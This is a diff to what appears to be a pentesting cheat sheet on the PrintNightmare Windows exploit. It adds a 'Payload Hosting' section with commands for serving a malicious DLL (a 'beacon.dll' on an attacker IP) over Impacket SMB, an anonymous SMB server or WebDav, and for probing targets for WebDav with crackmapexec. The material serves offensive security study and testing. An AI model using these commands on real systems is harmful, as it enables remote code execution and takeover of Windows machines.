@@ -711,9 +711,26 @@ Requirements:
   docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
   ```
 
-**Trigger the exploit**: 
+**Payload Hosting**: 
+* The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):
+```ps1
+python3 ./smbserver.py share /tmp/smb/
+```
+* Using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) (Admin rights required on host): 
+```ps1
+Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
+```
+* Using WebDav with [SharpWebServer](https://github.com/mgeeky/SharpWebServer) (Doesn't require admin rights):
+```ps1
+SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
+```
+When using WebDav instead of SMB, you must add `@[PORT]` to the hostname in the URI, e.g.: `\\172.16.1.5@8888\Downloads\beacon.dll`
+WebDav client **must** be activated on exploited target. By default it is not activated on Windows workstations (you have to `net start webclient`) and it's not installed on servers. Here is how to detect activated webdav:
+```ps1
+cme smb -u user -p password -d domain.local -M webdav [TARGET]
+```
 
-**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109): `python3 ./smbserver.py share /tmp/smb/` or using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) : `Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable`
+**Trigger the exploit**: 
 
 * [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
   ```powershell
